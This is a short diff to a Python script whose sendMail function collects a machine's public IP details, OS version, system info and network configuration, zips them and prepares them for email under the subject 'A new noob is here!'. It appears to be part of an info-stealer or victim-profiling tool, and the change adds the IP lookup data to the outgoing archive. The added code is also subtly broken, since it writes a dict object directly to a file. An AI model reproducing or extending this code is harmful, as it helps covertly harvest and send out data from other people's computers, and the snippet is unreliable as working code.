@@ -32,6 +32,9 @@ def sendMail():
     ipInfo = json.loads(os.popen('curl ipinfo.io').read())
     OSName = os.popen('ver').read()
 
+    f3 = open(f"{pathFolder}ipinfo.json", "w")
+    f3.write(ipInfo)
+    f3.close()
 
 
     subject = f"A new noob is here!"
@@ -91,6 +94,7 @@ def sendMail():
     with ZipFile(f'{pathFolder}{zipName}.zip', 'w') as myzip:
         myzip.write(f'{pathFolder}systeminfo.txt')
         myzip.write(f'{pathFolder}ipconfig.txt')
+        myzip.write(f"{pathFolder}ipinfo.json")
         myzip.write(f'readme.txt')
 
     filename = f"{pathFolder}{zipName}.zip"
